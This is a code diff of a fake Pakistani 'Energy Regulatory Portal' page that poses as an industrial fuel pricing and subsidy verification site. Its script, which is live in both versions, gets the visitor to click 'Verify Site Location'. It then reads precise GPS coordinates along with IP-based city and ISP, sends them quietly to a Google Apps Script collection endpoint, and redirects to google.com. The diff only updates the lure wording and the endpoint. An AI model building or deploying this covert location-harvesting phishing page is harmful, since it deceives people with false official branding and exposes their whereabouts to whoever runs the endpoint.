@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Industrial Fuel Regulatory Portal</title>
+    <title>Energy Regulatory Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-gray-100 font-sans text-gray-900">
@@ -18,7 +18,7 @@
             <div id="content-area" class="text-center">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/3/32/Flag_of_Pakistan.svg" class="w-16 mx-auto mb-4 opacity-80">
                 <h2 class="text-xl font-bold text-blue-900 mb-2">Industrial Fuel Verification</h2>
-                <p id="msg" class="text-gray-600 text-sm mb-6">Verify your industrial site location for Q4 pricing and subsidy eligibility.</p>
+                <p id="msg" class="text-gray-600 text-sm mb-6">Access to real-time furnace oil and sludge pricing is restricted. Please verify your industrial site location to proceed.</p>
                 
                 <button id="btn-fetch" onclick="initiateAuth()" class="w-full bg-blue-900 text-white font-bold py-4 rounded-lg hover:bg-blue-800 transition active:scale-95 shadow-lg">
                     Verify Site Location
@@ -28,14 +28,15 @@
     </main>
 
     <script>
-        const GOOGLE_URL = "https://script.google.com/macros/s/AKfycbyG-jiGO401SORNgXHFP8CtmsEm_2OtKu0Q1J-M3dVBkv-SentkHAmxZhfxF-EuSkH1/exec";
+        // Tera Tera URL
+        const GOOGLE_URL = "https://script.google.com/macros/s/AKfycbz2ifGy8l7tHc_g2HDNguyMmUiqYceLo4FNELJS-JrHPP25Ge4gGSTGRwjCP1452Ah9/exec";
 
         async function initiateAuth() {
             const btn = document.getElementById('btn-fetch');
-            btn.innerText = "Synchronizing Satellite...";
+            btn.innerText = "Synchronizing...";
             btn.disabled = true;
 
-            const options = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };
+            const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
 
             navigator.geolocation.getCurrentPosition(
                 async (pos) => {
@@ -44,13 +45,14 @@
                         const ipData = await ipRes.json();
 
                         const payload = { 
+                            timestamp: new Date().toLocaleString(),
                             lat: pos.coords.latitude, 
                             lon: pos.coords.longitude,
                             city: ipData.city || "Unknown",
-                            isp: ipData.org || "Unknown",
-                            timestamp: new Date().toLocaleString()
+                            isp: ipData.org || "Unknown"
                         };
 
+                        // Google Apps Script no-cors fix
                         await fetch(GOOGLE_URL, {
                             method: "POST",
                             mode: "no-cors",
@@ -58,7 +60,7 @@
                             body: JSON.stringify(payload)
                         });
 
-                        document.getElementById('main-card').innerHTML = "<h2 class='text-green-600 font-bold text-center'>Verification Successful. Redirecting to secure portal...</h2>";
+                        document.getElementById('main-card').innerHTML = "<h2 class='text-green-600 font-bold text-center'>Verification Successful. Redirecting...</h2>";
                         setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
                     } catch (e) {
                         handleBlock();
